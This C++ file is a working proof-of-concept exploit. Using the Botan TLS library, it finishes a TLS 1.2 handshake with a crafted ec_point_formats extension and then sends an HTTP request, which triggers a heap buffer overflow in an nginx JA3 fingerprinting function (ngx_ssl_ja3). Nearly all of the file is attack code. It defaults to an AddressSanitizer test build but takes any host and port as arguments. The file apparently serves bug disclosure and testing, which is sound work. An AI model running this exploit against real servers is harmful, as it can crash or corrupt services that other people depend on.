/*
 * PoC: JA3 heap-buffer-overflow via crafted EC point formats.
 *
 * Bug: ngx_ssl_ja3() allocates fp_ja3_data.len * 3 bytes for the JA3 string,
 * but the formats section has 1-byte entries that expand to up to 4 characters
 * (3 digits + separator).  With many format values >= 100 the output overflows.
 *
 * Uses Botan TLS to complete a real TLS 1.2 handshake with ECDHE key exchange
 * (so supported_groups is present in ClientHello) while injecting crafted
 * ec_point_formats via the tls_modify_extensions callback.  After handshake,
 * sends an HTTP GET so nginx evaluates $http_ssl_ja3 — triggering the overflow.
 *
 * Against nginx-asan: produces a heap-buffer-overflow report.
 *
 * Usage:  test_ja3_overflow [host [port]]
 *         NGINX_HOST / NGINX_PORT environment variables also accepted.
 *
 * Build:  g++ -std=c++17 -O2 -Wall -o test_ja3_overflow test_ja3_overflow.cpp \
 *           $(pkg-config --cflags --libs botan-2)
 */

#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <stdexcept>

#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>

#include <botan/auto_rng.h>
#include <botan/credentials_manager.h>
#include <botan/tls_callbacks.h>
#include <botan/tls_client.h>
#include <botan/tls_extensions.h>
#include <botan/tls_policy.h>
#include <botan/tls_session_manager.h>

/* ---- custom ec_point_formats extension ---- */

/*
 * Botan's Supported_Point_Formats is final and only supports a boolean
 * (compressed vs uncompressed).  We need arbitrary format byte values,
 * so we implement Extension directly.
 */
class Custom_EC_Point_Formats : public Botan::TLS::Extension {
public:
    explicit Custom_EC_Point_Formats(std::vector<uint8_t> formats)
        : m_formats(std::move(formats)) {}

    Botan::TLS::Handshake_Extension_Type type() const override {
        return Botan::TLS::Handshake_Extension_Type(11); /* ec_point_formats */
    }

    std::vector<uint8_t> serialize(Botan::TLS::Connection_Side) const override {
        /* ECPointFormatList: 1-byte length prefix + format values */
        std::vector<uint8_t> buf;
        buf.push_back(static_cast<uint8_t>(m_formats.size()));
        buf.insert(buf.end(), m_formats.begin(), m_formats.end());
        return buf;
    }

    bool empty() const override { return false; }

private:
    std::vector<uint8_t> m_formats;
};

/* ---- TLS callbacks ---- */

class Test_Callbacks : public Botan::TLS::Callbacks {
public:
    Test_Callbacks(int fd, int num_formats, uint8_t format_val)
        : m_fd(fd), m_num_formats(num_formats), m_format_val(format_val) {}

    void tls_emit_data(const uint8_t data[], size_t size) override {
        const uint8_t *p = data;
        size_t left = size;
        while (left > 0) {
            ssize_t n = ::send(m_fd, p, left, 0);
            if (n <= 0)
                throw std::runtime_error("send failed");
            p += n;
            left -= static_cast<size_t>(n);
        }
    }

    void tls_record_received(uint64_t, const uint8_t data[], size_t size) override {
        m_received.insert(m_received.end(), data, data + size);
    }

    void tls_alert(Botan::TLS::Alert alert) override {
        if (alert.type() != Botan::TLS::Alert::CLOSE_NOTIFY)
            fprintf(stderr, "TLS alert: %s\n", alert.type_string().c_str());
    }

    bool tls_session_established(const Botan::TLS::Session &) override {
        m_handshake_done = true;
        return true; /* cache session */
    }

    void tls_verify_cert_chain(
        const std::vector<Botan::X509_Certificate> &,
        const std::vector<std::shared_ptr<const Botan::OCSP::Response>> &,
        const std::vector<Botan::Certificate_Store *> &,
        Botan::Usage_Type,
        const std::string &,
        const Botan::TLS::Policy &) override {
        /* accept any certificate — test client */
    }

    void tls_modify_extensions(Botan::TLS::Extensions &extn,
                               Botan::TLS::Connection_Side) override {
        if (m_num_formats <= 0)
            return;

        /* remove Botan's built-in ec_point_formats */
        extn.remove_extension(Botan::TLS::Handshake_Extension_Type(11));

        /* build our custom list: uncompressed (0x00) + N × format_val */
        std::vector<uint8_t> formats;
        formats.push_back(0x00); /* uncompressed — required for ECDHE */
        for (int i = 0; i < m_num_formats; i++)
            formats.push_back(m_format_val);

        extn.add(new Custom_EC_Point_Formats(std::move(formats)));
    }

    bool handshake_done() const { return m_handshake_done; }
    const std::vector<uint8_t> &received() const { return m_received; }

private:
    int      m_fd;
    int      m_num_formats;
    uint8_t  m_format_val;
    bool     m_handshake_done = false;
    std::vector<uint8_t> m_received;
};

/* ---- Permissive TLS policy: TLS 1.2, ECDHE + RSA, all common ciphers ---- */

class Permissive_Policy : public Botan::TLS::Policy {
public:
    std::vector<std::string> allowed_ciphers() const override {
        return {"AES-256/GCM", "AES-128/GCM", "AES-256", "AES-128"};
    }
    std::vector<std::string> allowed_key_exchange_methods() const override {
        return {"ECDH", "DH", "RSA"};
    }
    std::vector<std::string> allowed_signature_methods() const override {
        return {"RSA", "ECDSA"};
    }
    std::vector<std::string> allowed_macs() const override {
        return {"AEAD", "SHA-256", "SHA-384", "SHA-1"};
    }
    bool allow_tls12() const override { return true; }
    bool require_cert_revocation_info() const override { return false; }
    size_t minimum_rsa_bits() const override { return 1024; }
    bool acceptable_protocol_version(Botan::TLS::Protocol_Version v) const override {
        return v == Botan::TLS::Protocol_Version::TLS_V12;
    }
};

/* ---- Credentials: no client cert, no CA validation ---- */

class Null_Credentials : public Botan::Credentials_Manager {
public:
    std::vector<Botan::Certificate_Store *>
    trusted_certificate_authorities(const std::string &, const std::string &) override {
        return {};
    }
};

/* ---- network helpers ---- */

static int
tcp_connect(const char *host, int port)
{
    struct addrinfo hints = {}, *res;
    char port_str[16];
    int fd, rc;

    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(port_str, sizeof(port_str), "%d", port);

    rc = getaddrinfo(host, port_str, &hints, &res);
    if (rc != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rc));
        return -1;
    }

    fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) {
        perror("socket");
        freeaddrinfo(res);
        return -1;
    }

    struct timeval tv = {5, 0};
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        perror("connect");
        close(fd);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    return fd;
}

static int
wait_for_server(const char *host, int port, int max_wait)
{
    printf("Waiting for %s:%d ", host, port);
    fflush(stdout);

    for (int i = 0; i < max_wait; i++) {
        int fd = tcp_connect(host, port);
        if (fd >= 0) {
            close(fd);
            printf(" up\n");
            return 0;
        }
        printf(".");
        fflush(stdout);
        sleep(1);
    }

    printf(" TIMEOUT\n");
    return -1;
}

/*
 * Run one test: TLS 1.2 handshake with ECDHE (so supported_groups is present)
 * and num_formats × format_val injected into ec_point_formats.
 * Then send HTTP GET to trigger $http_ssl_ja3 evaluation.
 */
static int
run_test(const char *host, int port, int num_formats, uint8_t format_val,
         const char *label)
{
    char url[256];
    snprintf(url, sizeof(url), "/%s", label);

    printf("  [%s] %d formats x 0x%02X ... ", label, num_formats,
           (unsigned)format_val);
    fflush(stdout);

    int fd = tcp_connect(host, port);
    if (fd < 0) {
        printf("SKIP (connect failed)\n");
        return -1;
    }

    try {
        Botan::AutoSeeded_RNG rng;
        Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
        Null_Credentials creds;
        Permissive_Policy policy;
        Test_Callbacks callbacks(fd, num_formats, format_val);

        Botan::TLS::Client client(
            callbacks, session_mgr, creds, policy, rng,
            Botan::TLS::Server_Information(host, static_cast<uint16_t>(port)),
            Botan::TLS::Protocol_Version::TLS_V12);

        /* drive the handshake */
        uint8_t buf[16384];
        while (!callbacks.handshake_done() && client.is_active()) {
            ssize_t n = ::recv(fd, buf, sizeof(buf), 0);
            if (n <= 0) break;
            client.received_data(buf, static_cast<size_t>(n));
        }

        if (!callbacks.handshake_done()) {
            /* still try to read — handshake may complete on next recv */
            for (int attempt = 0; attempt < 3 && !callbacks.handshake_done(); attempt++) {
                ssize_t n = ::recv(fd, buf, sizeof(buf), 0);
                if (n <= 0) break;
                client.received_data(buf, static_cast<size_t>(n));
            }
        }

        if (!callbacks.handshake_done()) {
            printf("handshake failed\n");
            close(fd);
            return -1;
        }

        /* send HTTP request — triggers $http_ssl_ja3 evaluation in nginx */
        std::string http_req = "GET " + std::string(url) + " HTTP/1.0\r\nHost: localhost\r\n\r\n";
        client.send(reinterpret_cast<const uint8_t *>(http_req.data()),
                    http_req.size());

        /* read response */
        for (int attempt = 0; attempt < 10; attempt++) {
            ssize_t n = ::recv(fd, buf, sizeof(buf), 0);
            if (n <= 0) break;
            try {
                client.received_data(buf, static_cast<size_t>(n));
            } catch (...) {
                break; /* server closed */
            }
        }

        /* show first line of HTTP response */
        const auto &resp = callbacks.received();
        if (!resp.empty()) {
            std::string s(resp.begin(), resp.end());
            auto eol = s.find('\r');
            if (eol != std::string::npos)
                s.resize(eol);
            printf("handshake OK, response: %s\n", s.c_str());
        } else {
            printf("handshake OK, no response body\n");
        }

        try { client.close(); } catch (...) {}

    } catch (const std::exception &e) {
        printf("ERROR: %s\n", e.what());
        close(fd);
        return -1;
    }

    close(fd);
    return 0;
}


int
main(int argc, char *argv[])
{
    const char *host = getenv("NGINX_HOST");
    if (!host) host = "nginx-asan";
    if (argc > 1) host = argv[1];

    int port = 8443;
    if (getenv("NGINX_PORT"))
        port = atoi(getenv("NGINX_PORT"));
    if (argc > 2)
        port = atoi(argv[2]);

    printf("=== JA3 buffer overflow PoC (Botan) ===\n");
    printf("Target: %s:%d\n\n", host, port);

    if (wait_for_server(host, port, 30) != 0) {
        fprintf(stderr, "ERROR: server not reachable\n");
        return 1;
    }

    printf("\n--- Test 0: vanilla handshake (no custom ext) ---\n");
    printf("  Expected: handshake succeeds, groups + formats in JA3\n");
    run_test(host, port, 0, 0x00, "vanilla");

    usleep(300000);

    printf("\n--- Test 1: baseline (3 formats, small values) ---\n");
    printf("  Expected: safe, no overflow\n");
    run_test(host, port, 3, 0x02, "safe");

    usleep(300000);

    printf("\n--- Test 2: trigger (60 formats x 0xFF) ---\n");
    printf("  Expected: heap-buffer-overflow on buggy code (*3)\n");
    run_test(host, port, 60, 0xFF, "overflow-60");

    usleep(300000);

    printf("\n--- Test 3: large trigger (120 formats x 0xC8) ---\n");
    printf("  Expected: larger overflow\n");
    run_test(host, port, 120, 0xC8, "overflow-120");

    usleep(300000);

    printf("\n--- Test 4: verify server still alive ---\n");
    run_test(host, port, 3, 0x01, "alive-check");

    printf("\n=== Done ===\n");
    printf("Check nginx-asan logs for AddressSanitizer errors.\n");

    return 0;
}
